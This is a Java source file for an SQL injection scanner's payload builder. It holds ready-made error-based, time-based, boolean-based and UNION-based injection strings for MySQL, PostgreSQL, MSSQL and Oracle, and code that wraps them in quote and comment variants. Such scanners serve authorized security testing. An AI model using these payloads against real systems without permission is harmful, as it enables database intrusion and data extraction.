package main;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ThreadLocalRandom;

/**
 * Generates SQL injection payloads for different detection strategies.
 * Supports database-specific payloads for MySQL, PostgreSQL, MSSQL, and Oracle.
 */
public class PayloadBuilder {

    public enum PayloadType {
        ERROR_BASED("Error-Based", "🔴"),
        BOOLEAN_BASED("Boolean-Based", "🟡"),
        TIME_BASED("Time-Based", "🟠"),
        UNION_BASED("Union-Based", "🔵"),
        CUSTOM("Custom", "⚪");

        public final String label;
        public final String icon;
        PayloadType(String label, String icon) { this.label = label; this.icon = icon; }
    }

    public enum DatabaseType {
        MYSQL("MySQL"),
        POSTGRESQL("PostgreSQL"),
        MSSQL("Microsoft SQL Server"),
        ORACLE("Oracle"),
        GENERIC("Generic");

        public final String label;
        DatabaseType(String label) { this.label = label; }
    }

    public static class Payload {
        public final String value;
        public final PayloadType type;
        public final DatabaseType dbType;
        public final String description;
        public final int confidenceWeight;
        public final String booleanTrueVariant;
        public final int expectedSleepSeconds;

        public Payload(String value, PayloadType type, DatabaseType dbType, String description, int weight) {
            this(value, type, dbType, description, weight, null, 0);
        }

        public Payload(String value, PayloadType type, DatabaseType dbType, String description, int weight, int sleepSeconds) {
            this(value, type, dbType, description, weight, null, sleepSeconds);
        }

        public Payload(String value, PayloadType type, DatabaseType dbType, String description, int weight, String trueVariant) {
            this(value, type, dbType, description, weight, trueVariant, 0);
        }

        private Payload(String value, PayloadType type, DatabaseType dbType, String description, int weight, String trueVariant, int sleepSeconds) {
            this.value = value;
            this.type = type;
            this.dbType = dbType;
            this.description = description;
            this.confidenceWeight = weight;
            this.booleanTrueVariant = trueVariant;
            this.expectedSleepSeconds = sleepSeconds;
        }
    }

    private final ScanConfig config;
    private DatabaseType selectedDbType = DatabaseType.GENERIC;

    private static final Map<DatabaseType, List<PayloadTemplate>> PAYLOAD_REGISTRY = new HashMap<>();

    static {
        initializeRegistry();
    }

    private static class PayloadTemplate {
        final String template;
        final PayloadType type;
        final DatabaseType dbType;
        final String description;
        final int weight;
        final boolean needsInference;
        final int sleepSeconds;
        final String trueVariant;

        PayloadTemplate(String template, PayloadType type, DatabaseType dbType, String description, int weight) {
            this(template, type, dbType, description, weight, false, 0, null);
        }

        PayloadTemplate(String template, PayloadType type, DatabaseType dbType, String description, int weight, int sleepSeconds) {
            this(template, type, dbType, description, weight, true, sleepSeconds, null);
        }

        PayloadTemplate(String template, PayloadType type, DatabaseType dbType, String description, int weight, String trueVariant) {
            this(template, type, dbType, description, weight, true, 0, trueVariant);
        }

        // Constructor for error-based payloads that need INFERENCE replacement
        PayloadTemplate(String template, PayloadType type, DatabaseType dbType, String description, int weight, boolean needsInference) {
            this(template, type, dbType, description, weight, needsInference, 0, null);
        }

        private PayloadTemplate(String template, PayloadType type, DatabaseType dbType, String description, int weight, boolean needsInference, int sleepSeconds, String trueVariant) {
            this.template = template;
            this.type = type;
            this.dbType = dbType;
            this.description = description;
            this.weight = weight;
            this.needsInference = needsInference;
            this.sleepSeconds = sleepSeconds;
            this.trueVariant = trueVariant;
        }
    }

    private static void initializeRegistry() {
        for (DatabaseType db : DatabaseType.values()) {
            PAYLOAD_REGISTRY.put(db, new ArrayList<>());
        }

        // ── ERROR-BASED PAYLOADS ──────────────────────────────────────────────

        // MySQL error-based
        addPayload(DatabaseType.MYSQL, new PayloadTemplate(
            "AND EXTRACTVALUE(0,CONCAT(0x7e,{INFERENCE},0x7e))",
            PayloadType.ERROR_BASED, DatabaseType.MYSQL, "EXTRACTVALUE XML error", 9, true
        ));
        addPayload(DatabaseType.MYSQL, new PayloadTemplate(
            "AND UPDATEXML(0,CONCAT(0x7e,{INFERENCE},0x7e),0)",
            PayloadType.ERROR_BASED, DatabaseType.MYSQL, "UPDATEXML XML error", 9, true
        ));
        addPayload(DatabaseType.MYSQL, new PayloadTemplate(
            "AND GTID_SUBSET(CONCAT(0x7e,{INFERENCE},0x7e),0)",
            PayloadType.ERROR_BASED, DatabaseType.MYSQL, "GTID_SUBSET error", 8, true
        ));
        addPayload(DatabaseType.MYSQL, new PayloadTemplate(
            "AND (SELECT !x-~0 FROM(SELECT {INFERENCE})x)",
            PayloadType.ERROR_BASED, DatabaseType.MYSQL, "BIGINT overflow error", 8, true
        ));

        // PostgreSQL error-based
        addPayload(DatabaseType.POSTGRESQL, new PayloadTemplate(
            "AND CAST({INFERENCE} AS NUMERIC)=1",
            PayloadType.ERROR_BASED, DatabaseType.POSTGRESQL, "CAST type conversion error", 8, true
        ));
        addPayload(DatabaseType.POSTGRESQL, new PayloadTemplate(
            "AND 1=CAST((SELECT {INFERENCE}) AS INT)",
            PayloadType.ERROR_BASED, DatabaseType.POSTGRESQL, "Integer conversion error", 8, true
        ));

        // MSSQL error-based
        addPayload(DatabaseType.MSSQL, new PayloadTemplate(
            "AND CONVERT(INT,{INFERENCE})=1",
            PayloadType.ERROR_BASED, DatabaseType.MSSQL, "CONVERT error", 9, true
        ));
        addPayload(DatabaseType.MSSQL, new PayloadTemplate(
            "AND CAST({INFERENCE} AS INT)=1",
            PayloadType.ERROR_BASED, DatabaseType.MSSQL, "CAST error", 8, true
        ));

        // Oracle error-based
        addPayload(DatabaseType.ORACLE, new PayloadTemplate(
            "AND CTXSYS.DRITHSX.SN(1,{INFERENCE})=1",
            PayloadType.ERROR_BASED, DatabaseType.ORACLE, "CTXSYS error", 8, true
        ));

        // Generic error-based (basic quote/syntax)
        addPayload(DatabaseType.GENERIC, new PayloadTemplate(
            "'",
            PayloadType.ERROR_BASED, DatabaseType.GENERIC, "Single quote - syntax break", 7
        ));
        addPayload(DatabaseType.GENERIC, new PayloadTemplate(
            "\"",
            PayloadType.ERROR_BASED, DatabaseType.GENERIC, "Double quote - syntax break", 6
        ));
        addPayload(DatabaseType.GENERIC, new PayloadTemplate(
            "' OR '1'='1",
            PayloadType.ERROR_BASED, DatabaseType.GENERIC, "Classic tautology", 8
        ));
        addPayload(DatabaseType.GENERIC, new PayloadTemplate(
            "1 AND 1=1",
            PayloadType.ERROR_BASED, DatabaseType.GENERIC, "Numeric AND true", 5
        ));

        // ── TIME-BASED PAYLOADS ───────────────────────────────────────────────

        // MySQL time-based
        addPayload(DatabaseType.MYSQL, new PayloadTemplate(
            "AND SLEEP({SLEEPTIME})",
            PayloadType.TIME_BASED, DatabaseType.MYSQL, "MySQL SLEEP()", 9, 6
        ));
        addPayload(DatabaseType.MYSQL, new PayloadTemplate(
            "AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES WHERE SLEEP({SLEEPTIME}))",
            PayloadType.TIME_BASED, DatabaseType.MYSQL, "MySQL SLEEP in subquery", 8, 6
        ));

        // PostgreSQL time-based
        addPayload(DatabaseType.POSTGRESQL, new PayloadTemplate(
            "AND PG_SLEEP({SLEEPTIME})",
            PayloadType.TIME_BASED, DatabaseType.POSTGRESQL, "PostgreSQL pg_sleep()", 9, 6
        ));
        addPayload(DatabaseType.POSTGRESQL, new PayloadTemplate(
            "AND (SELECT COUNT(*) FROM GENERATE_SERIES(1,{SLEEPTIME}000000))",
            PayloadType.TIME_BASED, DatabaseType.POSTGRESQL, "PostgreSQL heavy query", 7, 6
        ));

        // MSSQL time-based
        addPayload(DatabaseType.MSSQL, new PayloadTemplate(
            "WAITFOR DELAY '0:0:{SLEEPTIME}'",
            PayloadType.TIME_BASED, DatabaseType.MSSQL, "MSSQL WAITFOR DELAY", 9, 6
        ));

        // Oracle time-based
        addPayload(DatabaseType.ORACLE, new PayloadTemplate(
            "AND DBMS_LOCK.SLEEP({SLEEPTIME})=0",
            PayloadType.TIME_BASED, DatabaseType.ORACLE, "Oracle DBMS_LOCK.SLEEP", 9, 6
        ));
        addPayload(DatabaseType.ORACLE, new PayloadTemplate(
            "AND DBMS_PIPE.RECEIVE_MESSAGE('x',{SLEEPTIME})=0",
            PayloadType.TIME_BASED, DatabaseType.ORACLE, "Oracle DBMS_PIPE delay", 8, 6
        ));

        // Generic time-based
        addPayload(DatabaseType.GENERIC, new PayloadTemplate(
            "' AND SLEEP({SLEEPTIME}) AND '1'='1",
            PayloadType.TIME_BASED, DatabaseType.GENERIC, "Generic SLEEP attempt", 5, 6
        ));

        // ── BOOLEAN-BASED PAYLOADS ────────────────────────────────────────────

        // MySQL boolean
        addPayload(DatabaseType.MYSQL, new PayloadTemplate(
            "AND {INFERENCE}",
            PayloadType.BOOLEAN_BASED, DatabaseType.MYSQL, "AND inference", 8, "1=1"
        ));
        addPayload(DatabaseType.MYSQL, new PayloadTemplate(
            "OR {INFERENCE}",
            PayloadType.BOOLEAN_BASED, DatabaseType.MYSQL, "OR inference", 7, "1=1"
        ));

        // PostgreSQL boolean
        addPayload(DatabaseType.POSTGRESQL, new PayloadTemplate(
            "AND (SELECT CASE WHEN {INFERENCE} THEN 1 ELSE 0 END)=1",
            PayloadType.BOOLEAN_BASED, DatabaseType.POSTGRESQL, "CASE inference", 8, "1=1"
        ));

        // MSSQL boolean
        addPayload(DatabaseType.MSSQL, new PayloadTemplate(
            "AND (SELECT CASE WHEN {INFERENCE} THEN 1 ELSE 0 END)=1",
            PayloadType.BOOLEAN_BASED, DatabaseType.MSSQL, "CASE inference", 8, "1=1"
        ));

        // Oracle boolean
        addPayload(DatabaseType.ORACLE, new PayloadTemplate(
            "AND {INFERENCE}",
            PayloadType.BOOLEAN_BASED, DatabaseType.ORACLE, "AND inference", 8, "1=1"
        ));

        // Generic boolean
        addPayload(DatabaseType.GENERIC, new PayloadTemplate(
            "AND {INFERENCE}",
            PayloadType.BOOLEAN_BASED, DatabaseType.GENERIC, "AND inference", 8, "1=1"
        ));
        addPayload(DatabaseType.GENERIC, new PayloadTemplate(
            "OR {INFERENCE}",
            PayloadType.BOOLEAN_BASED, DatabaseType.GENERIC, "OR inference", 7, "1=1"
        ));

        // ── UNION-BASED PAYLOADS ──────────────────────────────────────────────

        for (int i = 1; i <= 5; i++) {
            String nulls = buildNulls(i);
            addPayload(DatabaseType.GENERIC, new PayloadTemplate(
                "UNION SELECT " + nulls,
                PayloadType.UNION_BASED, DatabaseType.GENERIC, "UNION with " + i + " NULL columns", 6
            ));
        }

        addPayload(DatabaseType.MYSQL, new PayloadTemplate(
            "UNION SELECT @@version",
            PayloadType.UNION_BASED, DatabaseType.MYSQL, "MySQL version extraction", 8
        ));
        addPayload(DatabaseType.POSTGRESQL, new PayloadTemplate(
            "UNION SELECT version()",
            PayloadType.UNION_BASED, DatabaseType.POSTGRESQL, "PostgreSQL version extraction", 8
        ));
        addPayload(DatabaseType.MSSQL, new PayloadTemplate(
            "UNION SELECT @@VERSION",
            PayloadType.UNION_BASED, DatabaseType.MSSQL, "MSSQL version extraction", 8
        ));
        addPayload(DatabaseType.ORACLE, new PayloadTemplate(
            "UNION SELECT banner FROM v$version",
            PayloadType.UNION_BASED, DatabaseType.ORACLE, "Oracle version extraction", 8
        ));
    }

    private static void addPayload(DatabaseType dbType, PayloadTemplate template) {
        PAYLOAD_REGISTRY.get(dbType).add(template);
    }

    private static String buildNulls(int count) {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < count; i++) {
            if (i > 0) sb.append(",");
            sb.append("NULL");
        }
        return sb.toString();
    }

    public PayloadBuilder(ScanConfig config) {
        this.config = config;
    }

    public void setDatabaseType(DatabaseType dbType) {
        this.selectedDbType = dbType == null ? DatabaseType.GENERIC : dbType;
    }

    public DatabaseType getSelectedDatabaseType() {
        return selectedDbType;
    }

    public List<Payload> buildPayloads() {
        List<Payload> all = new ArrayList<>();
        int sleepSec = config.getTimingBaselineSleepSec();

        if (config.isUseCustomOnly()) {
            for (String custom : config.getParsedCustomPayloads()) {
                all.add(new Payload(custom, PayloadType.CUSTOM, DatabaseType.GENERIC, "Custom payload", 5));
            }
            return all;
        }

        List<PayloadTemplate> templates = PAYLOAD_REGISTRY.getOrDefault(selectedDbType, PAYLOAD_REGISTRY.get(DatabaseType.GENERIC));
        List<PayloadTemplate> genericTemplates = PAYLOAD_REGISTRY.get(DatabaseType.GENERIC);

        List<PayloadTemplate> combined = new ArrayList<>();
        combined.addAll(templates);
        combined.addAll(genericTemplates);

        for (PayloadTemplate t : combined) {
            if (!isTypeEnabled(t.type)) continue;

            List<String> variants = expandPayloadTemplate(t, sleepSec);
            for (String variant : variants) {
                all.add(createPayloadFromTemplate(t, variant, sleepSec));
            }
        }

        return all;
    }

    private boolean isTypeEnabled(PayloadType type) {
        switch (type) {
            case ERROR_BASED: return config.isEnableErrorBased();
            case BOOLEAN_BASED: return config.isEnableBooleanBased();
            case TIME_BASED: return config.isEnableTimeBased();
            case UNION_BASED: return config.isEnableUnionBased();
            default: return true;
        }
    }

    private List<String> expandPayloadTemplate(PayloadTemplate t, int sleepSec) {
        List<String> variants = new ArrayList<>();
        String base = t.template;

        String randNum = String.valueOf(ThreadLocalRandom.current().nextInt(10000, 99999));
        base = base.replace("[RANDNUM]", randNum);
        base = base.replace("{SLEEPTIME}", String.valueOf(sleepSec));

        if (t.needsInference) {
            if (t.type == PayloadType.BOOLEAN_BASED) {
                variants.add(base.replace("{INFERENCE}", "1=1"));
                variants.add(base.replace("{INFERENCE}", "1=2"));
            } else if (t.type == PayloadType.TIME_BASED) {
                variants.add(base.replace("{INFERENCE}", "1=1"));
            } else if (t.type == PayloadType.ERROR_BASED) {
                variants.add(base.replace("{INFERENCE}", "VERSION()"));
                variants.add(base.replace("{INFERENCE}", "DATABASE()"));
                variants.add(base.replace("{INFERENCE}", "USER()"));
                variants.add(base.replace("{INFERENCE}", "@@VERSION"));
            } else {
                variants.add(base.replace("{INFERENCE}", "VERSION()"));
                variants.add(base.replace("{INFERENCE}", "DATABASE()"));
                variants.add(base.replace("{INFERENCE}", "USER()"));
            }
        } else {
            variants.add(base);
        }

        return addCommentVariants(variants);
    }

    private List<String> addCommentVariants(List<String> payloads) {
        List<String> expanded = new ArrayList<>();

        String[][] wrappers;
        switch (selectedDbType) {
                case MYSQL:
                wrappers = new String[][]{
                        {" ", ""}, {" ", "-- vOps"}, {" ", "#"},
                        {"' ", "-- vOps"}, {"' ", "#"},
                        {"\" ", "-- vOps"}, {"\" ", "#"},
                        {") ", "-- vOps"}, {") ", "#"},
                        {"') ", "-- vOps"}, {"') ", "#"},
                        {"\") ", "-- vOps"}, {"\") ", "#"}
                };
                break;
                case POSTGRESQL:
                case MSSQL:
                wrappers = new String[][]{
                        {" ", ""}, {" ", "-- vOps"},
                        {"' ", "-- vOps"}, {"\" ", "-- vOps"},
                        {") ", "-- vOps"}, {"') ", "-- vOps"}, {"\") ", "-- vOps"}
                };
                break;
                case ORACLE:
                wrappers = new String[][]{
                        {" ", ""}, {" ", "-- vOps"},
                        {"' ", "-- vOps"}, {"\" ", "-- vOps"}
                };
                break;
                default:
                wrappers = new String[][]{
                        {" ", ""}, {" ", "-- vOps"},
                        {"' ", "-- vOps"}, {"\" ", "-- vOps"}
                };
                break;
        }

        for (String payload : payloads) {
            for (String[] wrapper : wrappers) {
                expanded.add(wrapper[0] + payload + wrapper[1]);
            }
        }

        return expanded;
    }

    private Payload createPayloadFromTemplate(PayloadTemplate t, String fullPayload, int sleepSec) {
        switch (t.type) {
            case TIME_BASED:
                return new Payload(fullPayload, t.type, t.dbType, t.description, t.weight, sleepSec);
            case BOOLEAN_BASED:
                if (t.trueVariant != null) {
                    String truePayload = fullPayload.replace("1=2", "1=1").replace("1=1", "1=1");
                    return new Payload(fullPayload, t.type, t.dbType, t.description, t.weight, truePayload);
                }
                return new Payload(fullPayload, t.type, t.dbType, t.description, t.weight);
            default:
                return new Payload(fullPayload, t.type, t.dbType, t.description, t.weight);
        }
    }
}